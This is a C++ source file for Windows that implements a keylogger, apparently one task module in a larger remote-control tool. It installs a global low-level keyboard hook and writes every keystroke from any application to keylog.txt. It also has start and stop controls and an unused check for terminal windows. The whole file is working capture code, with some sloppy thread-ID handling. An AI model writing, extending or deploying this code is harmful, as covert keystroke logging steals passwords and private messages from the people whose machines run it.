#include "../includes/tasks.h"

std::atomic<bool> isRunning(false);
std::mutex fileMutex;

HHOOK hKeyboardHook = NULL;
DWORD hookThreadId = 0;

bool isFromTerminal()
{
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow == NULL)
    {
        return false;
    }

    DWORD processId;
    GetWindowThreadProcessId(foregroundWindow, &processId);
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
    if (processHandle == NULL)
    {
        return false;
    }

    TCHAR processName[MAX_PATH];
    if (GetModuleBaseName(processHandle, NULL, processName, sizeof(processName) / sizeof(TCHAR)) > 0)
    {
        CloseHandle(processHandle);
        return _tcscmp(processName, _T("cmd.exe")) == 0 || _tcscmp(processName, _T("powershell.exe")) == 0;
    }

    CloseHandle(processHandle);
    return false;
}

void logKey(DWORD vkCode)
{
    std::lock_guard<std::mutex> lock(fileMutex);
    std::ofstream logFile("keylog.txt", std::ios::app);
    if (!logFile.is_open())
    {
        std::cerr << "Failed to open keylogger log file." << std::endl;
        return;
    }

    std::map<DWORD, std::string> specialKeys = {
        {VK_SPACE, "SPACE"},
        {VK_RETURN, "ENTER"},
        {VK_BACK, "BACKSPACE"},
        {VK_TAB, "TAB"},
        {VK_SHIFT, "SHIFT"},
        {VK_CONTROL, "CTRL"},
        {VK_MENU, "ALT"},
        {VK_ESCAPE, "ESC"},
        {VK_DELETE, "DELETE"},
        {VK_LEFT, "LEFT"},
        {VK_RIGHT, "RIGHT"},
        {VK_UP, "UP"},
        {VK_DOWN, "DOWN"},
        {VK_CAPITAL, "CAPSLOCK"}
    };

    if ((vkCode >= 0x30 && vkCode <= 0x39) || (vkCode >= 0x41 && vkCode <= 0x5A)) // Digits && Letters
    {
        logFile << static_cast<char>(vkCode);
    }
    else if (specialKeys.count(vkCode))
    {
        logFile << "[" << specialKeys[vkCode] << "]";
    }
    else
    {
        logFile << "[VK_" << vkCode << "]";
    }

    logFile.close();
    std::cout << "Logged key: " << vkCode << std::endl;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        logKey(kbd->vkCode);
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void runHook()
{
    hookThreadId = GetCurrentThreadId();
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hKeyboardHook == NULL)
    {
        std::cerr << "Failed to set keyboard hook." << std::endl;
        isRunning = false;
        return;
    }
    MSG msg;
    while (isRunning.load())
    {
        if (GetMessage(&msg, NULL, 0, 0) == -1)
        {
            std::cerr << "GetMessage failed." << std::endl;
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hKeyboardHook);
    hKeyboardHook = NULL;
    std::cout << "Keylogger stopped." << std::endl;
    isRunning = false;
}

void startKeylogger()
{
    if (isRunning.load())
    {
        std::cout << "Keylogger is already running." << std::endl;
        return;
    }
    isRunning = true;
    std::cout << "Starting keylogger..." << std::endl;
    static std::thread hookThread;
    static DWORD hookThreadId = 0;
    hookThread = std::thread([&]()
                             {
        hookThreadId = GetCurrentThreadId();
        runHook(); });
}

void stopKeylogger()
{
    if (!isRunning.load())
    {
        std::cout << "Keylogger is not running." << std::endl;
        return;
    }
    isRunning = false;
    std::cout << "Stopping keylogger..." << std::endl;
    extern DWORD hookThreadId;
    if (hookThreadId != 0)
    {
        PostThreadMessage(hookThreadId, WM_QUIT, 0, 0);
    }
    {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
    }
    // Removed invalid PostThreadMessage(HWND_BROADCAST, WM_QUIT, 0, 0);
    if (hKeyboardHook != NULL)
    {
        UnhookWindowsHookEx(hKeyboardHook);
        hKeyboardHook = NULL;
    }
}